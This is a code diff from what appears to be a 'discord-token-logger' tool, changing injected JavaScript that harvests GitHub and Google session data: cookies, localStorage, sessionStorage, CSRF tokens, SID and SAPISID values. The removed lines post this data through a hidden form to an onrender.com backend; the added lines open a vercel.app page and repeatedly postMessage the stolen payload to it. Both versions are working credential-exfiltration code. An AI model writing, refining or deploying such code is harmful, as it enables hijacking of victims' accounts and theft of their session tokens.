@@ -2471,13 +2471,9 @@
       "var csrfInput=document.querySelector('input[name=authenticity_token]');if(csrfInput)tokens['authenticity_token']=csrfInput.value;" +
       "var userMeta=document.querySelector('meta[name=user-login]');if(userMeta)tokens['github_username']=userMeta.getAttribute('content');" +
       "var payload={cookie:cookies,localStorage:ls,sessionStorage:ss,tokens:tokens,type:'github',method:'github_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
-      "var ifr=document.createElement('iframe');ifr.name='_exf';ifr.style.display='none';document.body.appendChild(ifr);" +
-      "var fm=document.createElement('form');fm.method='POST';fm.action='https://discord-token-logger-backend.onrender.com/api/process-cookie-form';fm.target='_exf';" +
-      "var inp=document.createElement('input');inp.type='hidden';inp.name='data';inp.value=JSON.stringify(payload);" +
-      "fm.appendChild(inp);document.body.appendChild(fm);fm.submit();" +
-      "setTimeout(function(){try{document.body.removeChild(fm);document.body.removeChild(ifr);}catch(e){}},3000);" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?sent=1&type=github&method=github_cookie';" +
-      "window.open(redirectUrl,'_blank');" +
+      "var frontendUrl='https://discord-token-logger-frontend.vercel.app/?receive=1&type=github&method=github_cookie';" +
+      "var w=window.open(frontendUrl,'_blank');" +
+      "var attempts=0;var sendInterval=setInterval(function(){if(w&&!w.closed){w.postMessage(JSON.stringify(payload),'https://discord-token-logger-frontend.vercel.app');}attempts++;if(attempts>20){clearInterval(sendInterval);}},500);" +
       "}catch(e){console.error(e);}" +
       "return;" +
       "}" +
@@ -2516,13 +2512,9 @@
       "var tokens={};var metas=document.querySelectorAll('meta[name],meta[content]');" +
       "for(var i=0;i<metas.length;i++){var mn=metas[i].getAttribute('name')||metas[i].getAttribute('property')||'meta_'+i;var mc=metas[i].getAttribute('content');if(mc&&(mn.toLowerCase().indexOf('token')!==-1||mn.toLowerCase().indexOf('csrf')!==-1||mn.toLowerCase().indexOf('session')!==-1)){tokens[mn]=mc;}}" +
       "var payload={cookie:allCookies,sid:sid,sapisid:sapisid,localStorage:ls,sessionStorage:ss,tokens:tokens,type:'google',method:'google_cookie',timestamp:new Date().toISOString(),url:window.location.href};" +
-      "var ifr=document.createElement('iframe');ifr.name='_exf';ifr.style.display='none';document.body.appendChild(ifr);" +
-      "var fm=document.createElement('form');fm.method='POST';fm.action='https://discord-token-logger-backend.onrender.com/api/process-cookie-form';fm.target='_exf';" +
-      "var inp=document.createElement('input');inp.type='hidden';inp.name='data';inp.value=JSON.stringify(payload);" +
-      "fm.appendChild(inp);document.body.appendChild(fm);fm.submit();" +
-      "setTimeout(function(){try{document.body.removeChild(fm);document.body.removeChild(ifr);}catch(e){}},3000);" +
-      "var redirectUrl='https://discord-token-logger-frontend.vercel.app/?sent=1&type=google&method=google_cookie';" +
-      "window.open(redirectUrl,'_blank');" +
+      "var frontendUrl='https://discord-token-logger-frontend.vercel.app/?receive=1&type=google&method=google_cookie';" +
+      "var w=window.open(frontendUrl,'_blank');" +
+      "var attempts=0;var sendInterval=setInterval(function(){if(w&&!w.closed){w.postMessage(JSON.stringify(payload),'https://discord-token-logger-frontend.vercel.app');}attempts++;if(attempts>20){clearInterval(sendInterval);}},500);" +
       "}catch(e){console.error(e);}" +
       "return;" +
       "}" +
